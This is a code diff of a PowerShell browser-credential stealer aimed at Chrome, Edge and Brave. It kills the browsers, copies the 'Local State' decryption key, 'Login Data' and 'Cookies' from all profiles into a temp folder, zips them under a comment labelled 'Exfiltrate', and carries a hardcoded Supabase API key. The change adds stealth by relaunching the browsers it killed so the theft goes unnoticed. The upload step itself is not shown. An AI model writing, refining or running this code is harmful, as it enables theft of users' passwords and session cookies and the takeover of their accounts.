@@ -12,8 +12,11 @@ $sbKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6I
 $staging = Join-Path $env:TEMP "tmp_$(Get-Random)"
 New-Item -Path $staging -ItemType Directory -Force | Out-Null
 
-# Force kill browsers to release SQLite handles
-"chrome", "msedge", "brave", "browser" | ForEach-Object { Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue }
+$browserNames = @("chrome", "msedge", "brave")
+$runningBrowsers = Get-Process -Name $browserNames -ErrorAction SilentlyContinue
+
+# 1. Kill browsers
+$runningBrowsers | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
 $browsers = @{
@@ -25,13 +28,8 @@ $browsers = @{
 foreach ($b in $browsers.GetEnumerator()) {
     if (Test-Path $b.Value) {
         $dest = New-Item -Path (Join-Path $staging $b.Key) -ItemType Directory -Force
+        if (Test-Path "$($b.Value)\Local State") { Copy-Item "$($b.Value)\Local State" -Destination $dest -Force }
         
-        # Copy Master Key (Local State) for decryption
-        if (Test-Path "$($b.Value)\Local State") { 
-            Copy-Item "$($b.Value)\Local State" -Destination $dest -Force 
-        }
-        
-        # Target only logins and cookies across all profiles (Default, Profile 1, etc.)
         Get-ChildItem -Path $b.Value -Recurse -File -ErrorAction SilentlyContinue | Where-Object { 
             $_.Name -eq "Login Data" -or $_.Name -eq "Cookies" 
         } | ForEach-Object {
@@ -42,7 +40,17 @@ foreach ($b in $browsers.GetEnumerator()) {
     }
 }
 
-# Compress and Exfiltrate
+# 2. Immediate Restart of previously running browsers
+foreach ($proc in $runningBrowsers) {
+    try {
+        Start-Process $proc.Path -ErrorAction SilentlyContinue
+    } catch {
+        # Fallback if path is lost
+        Start-Process "$proc.name" -ErrorAction SilentlyContinue
+    }
+}
+
+# 3. Compress and Exfiltrate
 $zip = "$env:TEMP\c.zip"
 if (Test-Path $zip) { Remove-Item $zip -Force }
 Compress-Archive -Path "$staging\*" -DestinationPath $zip -Force
